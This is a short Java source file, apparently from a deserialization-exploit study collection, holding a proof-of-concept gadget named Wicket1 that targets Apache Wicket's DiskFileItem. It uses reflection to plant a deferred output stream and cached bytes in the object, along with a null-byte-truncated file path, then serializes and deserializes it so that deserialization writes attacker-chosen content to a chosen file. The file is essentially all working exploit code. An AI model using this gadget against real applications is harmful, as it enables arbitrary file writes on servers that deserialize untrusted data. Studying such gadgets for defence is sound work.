
import org.apache.wicket.util.io.DeferredFileOutputStream;
import org.apache.wicket.util.upload.DiskFileItem;

import java.io.File;
import java.lang.reflect.Field;

import static util.Util.serialize;
import static util.Util.unserialize;
/*
* 跟FileUpload1一样，只是需要导入，slf4j相关依赖
*
* */
public class Wicket1 {
    public static void main(String[] args) throws Exception{
        String charset="UTF-8";
        byte[] bytes   = "dragonkeep".getBytes(charset);
        File repository =new File("Wicket1/src/main/java/upload.txt\0");
        DeferredFileOutputStream dfos=new DeferredFileOutputStream(0,repository);
        DiskFileItem diskFileItem =new DiskFileItem(null,null,false,null,0,repository,null);

        Field dfosFile =DiskFileItem.class.getDeclaredField("dfos");
        dfosFile.setAccessible(true);
        dfosFile.set(diskFileItem,dfos);

        Field field2 = DiskFileItem.class.getDeclaredField("cachedContent");
        field2.setAccessible(true);
        field2.set(diskFileItem,bytes);
        serialize(diskFileItem);
        unserialize();
    }
}
